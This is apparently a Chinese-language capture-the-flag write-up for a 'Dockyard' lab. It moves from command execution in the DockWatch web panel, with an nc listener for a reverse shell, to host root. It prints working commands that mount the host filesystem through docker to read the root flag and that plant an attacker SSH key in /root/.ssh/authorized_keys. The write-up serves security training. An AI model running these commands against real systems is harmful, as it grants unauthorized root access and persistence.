立足点

访问 80 端口，是一个叫 DockWatch 的平台。运行着容器 dockwatch。

Commands 处可以命令执行，指定 container 和 params 即可。

使用 nc 管道反弹 shell。

先在攻击机开启端口监听：

1
2
3

┌──(root㉿kali)-[~/MazeSec/Dockyard]
└─# nc -lvnp 1234
listening on [any] 1234 ...

通过已有的镜像和 docker 命令，我们可以实现对宿主机文件的任意读取和写入。

1

docker run --rm -v /:/host ghcr.io/notifiarr/dockwatch:v0.6.567 cat /host/root/root.txt

docker run 让宿主机 docker daemon 新建并启动一个容器。

--rm 容器退出后自动删除。

-v /:/host 将宿主机的 / 整个文件系统挂载到容器的 /host 目录下。

ghcr.io/notifiarr/dockwatch:v0.6.567 使用这个镜像启动新容器。

cat /host/root/root.txt 执行新容器中的命令，这里是读取 root.txt。

要拿到宿主机 root 的完整 Shell，可以将攻击机的公钥写入其 /root/.ssh/authorized_keys 文件中。

攻击机生成并复制公钥：

1
2

ssh-keygen -t rsa -b 4096 -f ~/.ssh/pwn_key -N ""
cat ~/.ssh/pwn_key.pub

靶机执行命令写入公钥：

1

docker run --rm -v /:/host ghcr.io/notifiarr/dockwatch:v0.6.567 sh -c 'echo "ssh-rsa <公钥> root@kali" >> /host/root/.ssh/authorized_keys'
